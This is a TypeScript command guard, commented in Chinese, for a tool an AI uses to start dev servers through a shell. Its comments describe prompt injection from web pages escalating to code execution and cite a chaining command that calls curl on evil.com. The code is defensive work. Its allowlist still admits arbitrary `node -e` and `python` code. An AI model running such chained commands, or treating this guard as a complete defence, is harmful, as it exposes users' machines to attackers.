// PM-368：`start_terminal_monitor` 的指令收斂（FOX 決策：白名單 + shell 元字元拒絕，兩道疊加）。
//
// 為什麼需要：這支工具是 `spawn(command, { shell: true })`，而呼叫它的是 AI，
// AI 讀得到頁面內容（`read_page`），頁面內容是攻擊者可以控制的。
// **提示注入不需要任何漏洞就能變成 RCE** —— 一段寫在網頁裡的「請幫我執行 …」就夠了。
//
// 兩道檢查各自擋不同的東西，缺一不可：
//   白名單     擋「執行了不該執行的程式」（curl / powershell / rm …）
//   元字元拒絕 擋「用合法程式當跳板」（`npm run dev && curl evil.com`）

/** 允許的指令樣式。key = 第一個 token，value = null 代表其後不限，陣列代表第二個 token 必須是其中之一。 */
const ALLOWED: Record<string, string[] | null> = {
  // 卡片指定：npm/yarn/pnpm **run** *
  npm: ['run'],
  yarn: ['run'],
  pnpm: ['run'],
  npx: null,
  node: null,
  python: null,
  python3: null,
  vite: null,
  next: null,
  nuxt: null,
  flask: null,
  uvicorn: null,
  // 卡片指定：cargo **run** * / go **run** *
  cargo: ['run'],
  go: ['run'],
  ruby: null,
  php: null,
};

/**
 * 被拒絕的 shell 控制字元。
 *
 * ⚠ **`(` `)` 沒有單獨列入**，只擋 `$(`：卡片驗收條件 5 明確要求
 * `node -e "require('child_process').exec('...')"` 要能通過，而那串含有一般括號。
 * 擋的是命令替換 `$(...)` 與反引號，不是括號本身。
 */
const METACHARS: Array<{ token: string; name: string }> = [
  { token: '&', name: '&（背景執行／&& 串接）' },
  { token: '|', name: '|（管線／|| 串接）' },
  { token: ';', name: ';（指令分隔）' },
  { token: '$(', name: '$(（命令替換）' },
  { token: '`', name: '`（反引號命令替換）' },
  { token: '>', name: '>（輸出重導向）' },
  { token: '<', name: '<（輸入重導向）' },
  { token: '\n', name: '換行（等同於另起一道指令）' },
  { token: '\r', name: '歸位字元（等同於另起一道指令）' },
];

export interface GuardResult {
  ok: boolean;
  error?: string;
}

const ALLOWED_HINT = Object.entries(ALLOWED)
  .map(([k, v]) => (v ? `${k} ${v.join('/')} …` : `${k} …`))
  .join('、');

/** 拆出前兩個 token（忽略前後空白與重複空白）。 */
function tokens(command: string): string[] {
  return command.trim().split(/\s+/);
}

export function checkCommand(command: string): GuardResult {
  const raw = command ?? '';
  if (!raw.trim()) return { ok: false, error: '缺少 command 參數' };

  // ① shell 元字元 —— **先檢查**，因為 `npm run dev && curl evil.com` 的第一個 token
  //    是合法的 npm，只看白名單會放行。
  for (const mc of METACHARS) {
    if (raw.includes(mc.token)) {
      return {
        ok: false,
        error: `指令含有不允許的 shell 控制字元：${mc.name}。BugEzy 只會執行單一個 dev server 指令，不接受串接、重導向或命令替換。若你真的需要組合指令，請自己在終端機執行，再用 start_terminal_monitor 監控其中一個。`,
      };
    }
  }

  // ② 白名單
  const t = tokens(raw);
  const head = t[0].toLowerCase();
  if (!(head in ALLOWED)) {
    return {
      ok: false,
      error: `「${t[0]}」不在允許清單內。start_terminal_monitor 只用來監控開發伺服器，允許的是：${ALLOWED_HINT}。`,
    };
  }
  const second = ALLOWED[head];
  if (second && !second.includes((t[1] ?? '').toLowerCase())) {
    return {
      ok: false,
      error: `「${head}」只允許 ${second.map((x) => `${head} ${x}`).join(' 或 ')}，收到的是「${t.slice(0, 2).join(' ')}」。`,
    };
  }

  return { ok: true };
}

/** 供測試與說明用。 */
export const _ALLOWED_HEADS = Object.keys(ALLOWED);
